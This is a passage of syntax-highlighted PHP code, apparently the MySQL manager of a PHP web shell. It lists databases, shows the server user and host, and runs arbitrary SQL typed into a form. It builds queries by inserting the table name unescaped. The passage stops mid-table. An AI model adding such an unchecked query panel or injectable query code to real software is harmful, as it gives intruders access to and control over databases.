<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;MySQL '</span>.$<span style="color: #eeeeec;">mysqlver</span>.<span style="color: #ad7fa8; font-style: italic;">' running in '</span>.$<span style="color: #eeeeec;">dbhost</span>.<span style="color: #ad7fa8; font-style: italic;">' as '</span>.$<span style="color: #eeeeec;">dbuser</span>.<span style="color: #ad7fa8; font-style: italic;">'@'</span>.$<span style="color: #eeeeec;">dbhost</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">highver</span> = $<span style="color: #eeeeec;">mysqlver</span> &gt; <span style="color: #ad7fa8; font-style: italic;">'4.1'</span> ? <span style="color: #eeeeec; background-color: #2e3436;">1</span> : <span style="color: #eeeeec; background-color: #2e3436;">0</span>;

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">query</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW DATABASES"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbs</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbs</span>[] = <span style="color: #ad7fa8; font-style: italic;">'-- Select a database --'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">db</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">query</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbs</span>[$<span style="color: #eeeeec;">db</span>[<span style="color: #ad7fa8; font-style: italic;">'Database'</span>]] = $<span style="color: #eeeeec;">db</span>[<span style="color: #ad7fa8; font-style: italic;">'Database'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeselect(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Please select a database:'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'db[]'</span>,<span style="color: #ad7fa8; font-style: italic;">'option'</span>=&gt;$<span style="color: #eeeeec;">dbs</span>,<span style="color: #ad7fa8; font-style: italic;">'selected'</span>=&gt;$<span style="color: #eeeeec;">dbname</span>,<span style="color: #ad7fa8; font-style: italic;">'onchange'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'moddbname(this.options[this.selectedIndex].value)'</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">tabledb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">dbname</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #eeeeec;">dbname</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">dbname</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">tablename</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\');"&gt;'</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">mysql_select_db(</span>$<span style="color: #eeeeec;">dbname</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">getnumsql</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">runquery</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">sql_query</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">runquery</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">allowedit</span> = <span style="color: #eeeeec; background-color: #2e3436;">0</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">tablename</span> &amp;&amp; !$<span style="color: #eeeeec;">sql_query</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">sql_query</span> = <span style="color: #ad7fa8; font-style: italic;">"SELECT * FROM $tablename"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">getnumsql</span> = $<span style="color: #eeeeec;">sql_query</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">sql_query</span> = $<span style="color: #eeeeec;">sql_query</span>.<span style="color: #ad7fa8; font-style: italic;">" LIMIT $start_limit, $pagenum"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">allowedit</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="POST"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '</span>.$<span style="color: #eeeeec;">dbname</span>.<span style="color: #ad7fa8; font-style: italic;">':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'</span>.<span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">sql_query</span>,<span style="color: #8ae234;">ENT_QUOTES</span>).<span style="color: #ad7fa8; font-style: italic;">'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'tablename'</span>, $<span style="color: #eeeeec;">tablename</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/form&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">tablename</span> || ($<span style="color: #eeeeec;">runquery</span> &amp;&amp; $<span style="color: #eeeeec;">sql_query</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'structure'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SHOW FULL COLUMNS FROM $tablename"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span>($<span style="color: #eeeeec;">row</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">result</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rowdb</span>[] = $<span style="color: #eeeeec;">row</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">rowdb</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">row</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Type'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Collation'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Null'</span>].<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;'</span>);
